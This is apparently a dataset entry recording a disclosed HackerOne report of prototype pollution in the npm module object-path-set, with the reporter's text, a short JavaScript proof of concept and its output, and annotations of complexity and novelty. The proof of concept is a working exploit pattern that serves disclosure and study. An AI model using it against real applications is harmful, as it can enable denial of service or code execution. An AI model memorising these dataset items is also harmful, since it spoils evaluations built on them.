@@ -1,0 +1,38 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "d3lla ",
+    "title": "[object-path-set] Prototype pollution",
+    "content": "\nI would like to report a prototype pollution vulnerability in object-path-set module.\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: object-path-set\nversion: 1.0.0\nnpm page: https://www.npmjs.com/package/object-path-set\nModule Description\nset values in javascript objects by specifying a path.\nif the path doesn't exist yet, it will be created.\nModule Stats\n[81] weekly downloads\nVulnerability\nVulnerability Description\nThe setPath function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\ninstall object-path-set module:\nnpm i object-path-set\nnpm i object-path-set\nSet the __proto__.polluted property of an object:\nCode 183 Bytes\n1\n2const setPath = require('object-path-set');\n3const obj = {};\n4console.log(\"Before : \" + obj.polluted);\n5setPath({}, '__proto__.polluted', 'yes');\n6console.log(\"After : \" + obj.polluted);\nOutput:\nCode 31 Bytes\n1\n2Before : undefined\n3After : yes\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Modification of Assumed-Immutable Data (MAID)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1597928880,
+    "report_url": "https://hackerone.com/reports/878332",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install the object-path-set module: npm i object-path-set"
+        ],
+        [
+            2,
+            "Run the following code to demonstrate prototype pollution:\nconst setPath = require('object-path-set');\nconst obj = {};\nconsole.log(\"Before : \" + obj.polluted);\nsetPath({}, '__proto__.polluted', 'yes');\nconsole.log(\"After : \" + obj.polluted);"
+        ]
+    ],
+    "vuln_description": "The setPath function in the object-path-set module can be used to add or modify properties of the Object prototype, leading to prototype pollution. This means that properties injected into Object.prototype will be present on all objects, potentially leading to security issues such as Denial of Service (DoS), Remote Code Execution, or Property Injection.",
+    "reason": "The vulnerability is straightforward to discover as it involves a well-known attack pattern (prototype pollution) and requires minimal steps to reproduce. The attack does not involve multiple components, complex application states, or novel logic. It is a direct exploitation of a common JavaScript vulnerability pattern.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
